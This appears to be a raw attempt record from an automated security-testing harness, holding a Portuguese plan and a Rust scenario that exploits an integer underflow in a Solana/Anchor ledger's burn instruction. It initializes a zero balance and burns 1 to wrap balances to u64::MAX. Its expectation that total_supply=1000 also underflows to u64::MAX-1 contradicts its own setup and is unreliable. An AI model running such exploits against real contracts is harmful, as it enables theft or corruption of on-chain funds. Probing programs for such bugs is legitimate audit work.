attempts.raw:
{
  "plan": "Inicializa o ledger com total_supply=1000 e user_balance=0 via baseline da instrucao initialize, usando a authority como signer e pagadora. Em seguida, chama burn com amount=1, que e maior que user_balance=0, para testar o underflow. O ataque deve fazer user_balance e total_supply darem a volta para u64::MAX e u64::MAX-1, respectivamente. O efeito mede se user_balance resultante e u64::MAX (underflow) em vez de a instrucao falhar.",
  "scenario": "let authority = Pubkey::new_unique();
let ledger_key = Pubkey::new_unique();

let init_ix = env.anchor_ix(
    "initialize",
    &(1000u64,),
    vec![
        AccountMeta::new(ledger_key, true),
        AccountMeta::new(authority, true),
        AccountMeta::new_readonly(solana_program::system_program::id(), false),
    ],
);

let init_accounts = vec![
    (ledger_key, empty_account()),
    (authority, wallet(1_000_000_000)),
    system_program_account(),
];

let baseline_result = env.baseline("initialize ledger", &init_ix, &init_accounts);

let ledger_after_init = after(&baseline_result, &ledger_key).clone();

let burn_ix = env.anchor_ix(
    "burn",
    &(1u64,),
    vec![
        AccountMeta::new(ledger_key, false),
        AccountMeta::new_readonly(authority, true),
    ],
);

let burn_accounts = vec![
    (ledger_key, ledger_after_init),
    (authority, wallet(1_000_000_000)),
];

let attack_result = env.attack("burn amount > user_balance", &burn_ix, &burn_accounts);

if attack_result.program_result == ProgramResult::Success {
    let ledger_data = after(&attack_result, &ledger_key).data();
    let user_balance = read_u64(ledger_data, 40);
    let total_supply = read_u64(ledger_data, 8);
    env.effect("user_balance underflowed to u64::MAX", user_balance == u64::MAX);
    env.effect("total_supply underflowed to u64::MAX - 1", total_supply == u64::MAX - 1);
}"
}

